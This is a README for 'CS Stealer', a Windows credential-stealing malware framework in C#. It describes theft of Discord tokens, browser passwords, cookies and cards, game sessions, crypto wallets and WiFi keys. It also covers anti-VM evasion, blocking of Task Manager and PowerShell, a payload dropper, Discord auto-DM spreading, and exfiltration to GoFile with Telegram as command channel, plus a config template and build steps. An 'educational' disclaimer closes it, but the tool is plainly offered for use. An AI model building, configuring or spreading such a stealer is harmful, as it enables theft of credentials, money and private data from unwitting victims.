# CS Stealer

A comprehensive data collection tool developed in C# .NET 8.0 for Windows, designed for security research and educational purposes.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Technical Details](#technical-details)
- [Configuration](#configuration)
- [Building](#building)
- [Project Structure](#project-structure)
- [Dependencies](#dependencies)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

## Overview

CS Stealer is a modular data collection framework that demonstrates various information gathering techniques on Windows systems. The project is organized into separate modules for different data collection categories, making it easy to understand and modify individual components.

The tool collects data from multiple sources including browsers, gaming platforms, cryptocurrency wallets, and system information, then packages everything into a compressed archive for analysis.

## Features

### Core Functionality

- **Discord Token Recovery**: Extracts and decrypts Discord authentication tokens from local storage, validates them, and retrieves complete account information including username, email, phone number, and premium status.

- **Browser Data Extraction**: Recovers passwords, cookies, browsing history, saved credit cards, and download history from Chromium-based browsers using an embedded payload executed with elevated privileges.

- **Game Session Recovery**: Collects authentication data from multiple gaming platforms:
  - Steam (config and userdata)
  - Epic Games (launcher configuration)
  - Telegram (tdata folder)
  - Minecraft (multiple launcher support: Intent, Lunar, TLauncher, Feather, Meteor, Impact, Novoline, CheatBreakers, Microsoft Store, Rise, Paladium, PolyMC, Badlion)
  - UPlay/Ubisoft (launcher configuration)
  - Riot Games

- **Cryptocurrency Wallets**: Extracts wallet data from various cryptocurrency applications including Bitcoin, Ethereum, Exodus, Atomic Wallet, Guarda, Coinomi, and others.

- **File Collection**: Selectively copies files with specific extensions (.png, .pdf, .jpeg, .jpg, .webp, .txt, .key, .locked, .avif, .svg, .env, .config) from Desktop, Downloads, Pictures, and Videos directories with configurable size limits.

- **System Information**: Gathers comprehensive system details including:
  - User and machine information
  - Operating system version
  - Public IP address (with VPN detection and termination)
  - CPU specifications (name, cores, logical processors, clock speed)
  - RAM information
  - GPU details (name, VRAM, driver version)
  - Disk information (free space, total size, file system)
  - Running process list
  - Windows product key

- **WiFi Credentials**: Extracts stored WiFi network profiles and passwords.

- **Advanced Data Collection**: Captures environment variables (system, user, and process PATH), system variables, and current process information.

- **Capture Features**: Takes screenshots and captures clipboard content.

### Optional Features

- **Anti-VM Detection**: Configurable virtual machine and sandbox detection to prevent analysis in controlled environments.

- **Application Blocking**: Optional blocking of Task Manager, PowerShell, and Command Prompt during execution.

- **Executable Dropper**: Optional functionality to download and execute additional payloads during runtime.

- **Auto Discord DM**: Optional feature to automatically send messages to all contacts using recovered Discord tokens.

### Data Exfiltration

- **Archiving**: All collected data is compressed into a ZIP archive.
- **Upload**: Data is uploaded to GoFile.io file hosting service.
- **Telegram Notification**: Sends a notification message via Telegram bot with file details and download link.
- **Cleanup**: Automatically removes local traces after successful upload.

## Technical Details

### Architecture

The project follows a modular architecture with separate classes for each functionality:

- `__Main__`: Main entry point and orchestration
- `DiscordRecovery`: Discord token extraction and account information
- `BrowsersRecovery`: Browser data collection
- `Sessions`: Game platform session recovery
- `Wallets`: Cryptocurrency wallet extraction
- `FileStealer`: Selective file collection
- `SystemUtils`: System information gathering
- `Wifis`: WiFi credential extraction
- `Advanced`: Developer and environment data
- `Screenshot`: Screen capture functionality
- `AntiVM`: Virtual machine detection
- `Blocker`: Application blocking
- `Dropper`: Payload dropping
- `DiscordDMAll`: Automated Discord messaging
- `Uploader`: Data exfiltration
- `Debugger`: Logging system
- `Config`: Configuration management

### Security Features

- Global mutex to prevent multiple simultaneous executions
- Configurable anti-VM and sandbox detection
- Automatic cleanup of temporary files
- Secure data transmission via HTTPS

## Configuration

All configuration is managed through the `Config.cs` file:

```csharp
public class Config
{
    public class C2
    {
        public static string TelegramBotToken = "Your bot token here";
        public static string TelegramChatID = "Your chat id here";
    }
    
    public static string OutputDir = Path.Combine(...);
    public static int StolenFilesLogMaxSize = 75; // In MB
    public static bool EnableAntiVM = true;
    public static bool BlockApps = false;
    public static bool DropAnExecutable = false;
    public static bool EnableAntiVM = true;
    public static bool BlockApps = false;
    public static bool AutoDiscordDMAll = false;
    public static string AutoDiscordDMAllMessageContent = "Leave empty if AutoDiscordDMAll is false or put the message to dmall.";
}
```

### Configuration Options

- **C2 Settings**: Telegram bot token and chat ID for notifications
- **Output Directory**: Temporary directory for data collection
- **File Size Limit**: Maximum size for stolen files directory (in MB)
- **Anti-VM**: Enable/disable virtual machine detection
- **Block Apps**: Enable/disable blocking of Task Manager, PowerShell, CMD
- **Drop Executable**: Enable/disable dropping additional payloads
- **Auto Discord DM**: Enable/disable automatic Discord messaging

## Building

### Prerequisites

- .NET 8.0 SDK or Visual Studio 2022
- Windows 10/11

### Build Commands

Run `Quick Setup.bat` then  `Build.bat` OR use cmd :

```bash
cd CsStealer
dotnet restore
dotnet build -c Release
dotnet publish -c Release 
```

The compiled executable will be located in `bin/Release/net8.0-windows/win-x64/publish/`.

### Quick Setup

A `QuickSetup.bat` script is provided for automated build setup.

## Project Structure

```
CsStealer/
├── __Main__.cs              # Main entry point
├── Config.cs                # Configuration management
├── Credits.cs               # Project credits
├── DiscordRecovery.cs       # Discord token extraction
├── BrowsersRecovery.cs      # Browser data collection
├── Sessions.cs              # Game session recovery
├── Walllets.cs              # Cryptocurrency wallets
├── FileStealer.cs           # File collection
├── SystemUtils.cs           # System information
├── Wifis.cs                 # WiFi credentials
├── Advanced.cs              # Advanced data collection
├── Screenshot.cs            # Screen capture
├── AntiVM.cs                # VM detection
├── Blocker.cs               # Application blocking
├── Dropper.cs               # Payload dropping
├── DiscordDMAll.cs          # Auto Discord messaging
├── Uploader.cs              # Data exfiltration
├── Debugger.cs              # Logging system
└── CompiledDatas/           # Embedded resources
```

## Dependencies

The project uses the following NuGet packages:

- **Microsoft.Data.Sqlite** (v9.0.10): SQLite database access for browser data extraction
- **System.Drawing.Common** (v9.0.10): Image manipulation for screenshots
- **System.Management** (v9.0.10): Windows Management Instrumentation (WMI) for system information
- **System.Security.Cryptography.ProtectedData** (v9.0.10): DPAPI decryption for protected data
- **TextCopy** (v6.2.1): Clipboard access

## Credits

**Author**: Noone

- GunsLol: https://guns.lol/Noone.cs
- Telegram: https://t.me/cslogs

This project also uses https://github.com/PhillyStyle/chrome_v20_decryption_CSharp for browsers recovery.

## Disclaimer

This software is provided for educational and security research purposes only. The use of this software to access systems or data without explicit authorization is illegal and may result in criminal prosecution. The authors and contributors are not responsible for any misuse of this code.

Users are responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. This tool should only be used on systems you own or have explicit written permission to test.

